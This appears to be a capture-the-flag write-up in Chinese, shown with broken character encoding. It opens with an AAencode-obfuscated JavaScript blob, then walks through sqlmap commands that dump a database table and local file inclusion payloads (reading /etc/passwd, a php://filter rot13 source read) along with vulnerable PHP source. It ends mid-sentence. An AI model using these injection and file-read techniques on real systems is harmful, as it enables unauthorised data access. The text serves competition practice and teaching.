[(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ ((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [(ï¾Ÿï½°ï¾Ÿ) - (ï¾ŸÎ˜ï¾Ÿ)]+(ï¾ŸĞ”ï¾Ÿ) ['c']+((ï¾ŸĞ”ï¾Ÿ)+'_') [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ (ï¾ŸĞ”ï¾Ÿ) ['o']+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ];(ï¾ŸĞ”ï¾Ÿ) ['_'] =(o^_^o) [ï¾Ÿoï¾Ÿ] [ï¾Ÿoï¾Ÿ];(ï¾ŸÎµï¾Ÿ)=((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸĞ”ï¾Ÿ) .ï¾ŸĞ”ï¾Ÿï¾‰+((ï¾ŸĞ”ï¾Ÿ)+'_') [(ï¾Ÿï½°ï¾Ÿ) + (ï¾Ÿï½°ï¾Ÿ)]+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [o^_^o -ï¾ŸÎ˜ï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸÏ‰ï¾Ÿï¾‰ +'_') [ï¾ŸÎ˜ï¾Ÿ]; (ï¾Ÿï½°ï¾Ÿ)+=(ï¾ŸÎ˜ï¾Ÿ); (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]='\\\\'; (ï¾ŸĞ”ï¾Ÿ).ï¾ŸÎ˜ï¾Ÿï¾‰=(ï¾ŸĞ”ï¾Ÿ+ ï¾Ÿï½°ï¾Ÿ)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)];(oï¾Ÿï½°ï¾Ÿo)=(ï¾ŸÏ‰ï¾Ÿï¾‰ +'_')[c^_^o];(ï¾ŸĞ”ï¾Ÿ) [ï¾Ÿoï¾Ÿ]='\\&quot;';(ï¾ŸĞ”ï¾Ÿ) ['_'] ( (ï¾ŸĞ”ï¾Ÿ) ['_'] (ï¾ŸÎµï¾Ÿ+(ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (o^_^o)+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (o^_^o)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]) (ï¾ŸÎ˜ï¾Ÿ)) ('_') ä½¿ç”¨https://www.qtool.net/decodeè¿™ä¸ªç½‘å€å°±å¯ä»¥è§£ç äº† web-2é¢˜ç›®åœ°å€ 172.31.65.174:80 ä¸€å¼€å§‹ä¸€ä¸ªæœç´¢æ¡†ï¼Œè€ƒç‚¹å°±é‚£å‡ ä¸ªsqlï¼Œsstiï¼Œå‘½ä»¤æ‰§è¡Œâ€¦ï¼Œå…ˆè¯•è¯•å•å¼•å·ï¼Œå‘ç°æŠ¥é”™äº† å‘ç°æŠ¥é”™äº†æ‰€ä»¥æ˜¯sqlæŠ¥é”™æ³¨å…¥ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨sqlmapå»è·‘å°±å¥½äº† sqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; --dbssqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tablessqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tables -T db_newssqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tables -T db_news --columnsqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tables -T db_news --columns -C flag --dump web-3é¢˜ç›®åœ°å€ 172.31.65.175 æœå¯»ä¿¡æ¯ï¼ŒæŸ¥çœ‹ä¸€ä¸‹é¡µé¢æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªindex.phpç‚¹è¿›å»ä»¥åç»§ç»­æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸ªå‚æ•°?page=indexï¼ŒæŸ¥çœ‹çš„æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥è¯•è¯•æ˜¯ä¸æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰ å‘ç°å¯ä»¥è¯»åˆ°/etc/passwd éé¢„æœŸè§£ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶è¯»å–çš„é¢˜ç›®ï¼Œflagéƒ½ä¼šåœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥ç›´æ¥è¯»å–å°±å¥½äº† ?page=/flag é¢„æœŸè§£ï¼šé¢„æœŸè§£çš„è¯ï¼Œè‚¯å®šæ˜¯è¦å…ˆè¯»ä¸€ä¸‹æºç ï¼Œæ‰€ä»¥éœ€è¦é…åˆphpä¼ªåè®®è¿›è¡Œæºç çš„è¯»å– è¯•äº†å‡ ä¸ªï¼Œå‘ç°ä½¿ç”¨rot13ç¼–ç å°±å¯ä»¥äº†ï¼Œä½†æ˜¯ç°åœ¨ä»£ç ä¹Ÿè¯»ä¸äº†ï¼Œéœ€è¦ä½¿ç”¨rot13è§£ç (ä¸è¿‡è¿™é¢˜ç›´æ¥ç»™äº†rot13è¿™ä¸ªç¼–ç ï¼Œâ€¦..) http://192.168.87.183/index.php?page=php://filter/read=string.rot13/resource=index.php ç„¶åæ¥å®¡ä¸€ä¸‹æºç  &lt;?php$page = $_get['page'];if (isset($page)) {if (preg_match(&quot;/^.+base.+$/&quot;,$page)) {#è¯´æ˜è¿‡æ»¤äº†base?&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die(&quot;&lt;/br&gt;not base&quot;);?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }else{ ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt; &lt;?php if ($page === 'index.php') { die('ok'); } include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }} $hashed_key = 'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b'; $parsed = parse_url($_server['request_uri']); $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query);#å­˜åœ¨å˜é‡è¦†ç›– if($parsed_query!=null){ $action = $parsed_query['action']; } if($action===&quot;auth&quot;){ $key = $_get[&quot;key&quot;]; $hashed_input = hash('sha384', $key);#ä½¿ç”¨sha384åŠ å¯†key //echo $hashed_input.'\\n'; if($hashed_input!==$hashed_key){#sha384åŠ å¯†ä»¥åçš„keyè¦ç­‰äºæœ¬æ¥çš„hashed_key die(&quot;no way to get flag!&quot;); } echo file_get_contents(&quot;/flag&quot;); } ?&gt;&lt;/body&gt; æ€è·¯ï¼šé€šè¿‡å˜é‡è¦†ç›–ï¼Œå°†hash_keyå˜é‡è¦†ç›–ä¸ºæˆ‘ä»¬å¯æ§çš„key parse_url()å°†urlè§£æåï¼Œè¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«queryè¿™ä¸ªå­—æ®µï¼Œç”¨æ¥å­˜å‚¨ä¼ å…¥çš„å‚æ•°å€¼parse_str() 